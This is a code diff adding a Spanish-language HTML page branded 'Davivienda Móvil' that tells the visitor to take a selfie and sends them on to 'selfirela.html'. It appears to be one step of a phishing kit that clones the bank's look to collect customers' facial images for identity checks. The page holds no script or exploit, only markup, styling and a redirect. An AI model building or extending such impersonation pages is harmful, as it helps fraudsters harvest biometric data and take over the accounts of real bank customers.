@@ -1,0 +1,117 @@
+
+<!DOCTYPE html>
+
+<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Davivienda Móvil</title>
+
+    <link href="css2" rel="stylesheet">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background: #ffffff;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 22px;
+        }
+
+        .wrap {
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+
+        /* Título */
+        .title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #202020;
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+
+        /* Subtítulo */
+        .subtitle {
+            font-size: 14px;
+            font-weight: 400;
+            color: #606060;
+            line-height: 20px;
+            margin-bottom: 55px;
+            padding: 0 10px;
+        }
+
+        /* Contenedor circular */
+        .photo-box {
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            border: 5px solid #e5e5e5;
+            padding: 8px;
+            margin: 0 auto 70px auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #f3f3f3;
+        }
+
+        .photo-box img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        /* Botón */
+        .btn {
+            width: 100%;
+            background: #e30613; /* Rojo Davivienda */
+            border: none;
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+            padding: 17px;
+            border-radius: 45px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .btn:hover {
+            background: #cc0511;
+        }
+
+        .btn:active {
+            transform: scale(0.97);
+        }
+    </style>
+</head>
+
+<body>
+    <div class="wrap" bis_skin_checked="1">
+
+        <div class="title" bis_skin_checked="1">Tome una foto de su rostro</div>
+
+        <div class="subtitle" bis_skin_checked="1">
+            Busque un espacio iluminado y haga una expresión neutra.<br>
+            No use gafas, sombreros ni accesorios que cubran su rostro.
+        </div>
+
+        <div class="photo-box" bis_skin_checked="1">
+            <img src="image-removebg-preview-(12).png" alt="Foto del rostro">
+        </div>
+
+        <button class="btn" onclick="window.location.href=&#39;selfirela.html&#39;">
+            Continuar
+        </button>
+
+    </div>
+</body>
+</html>
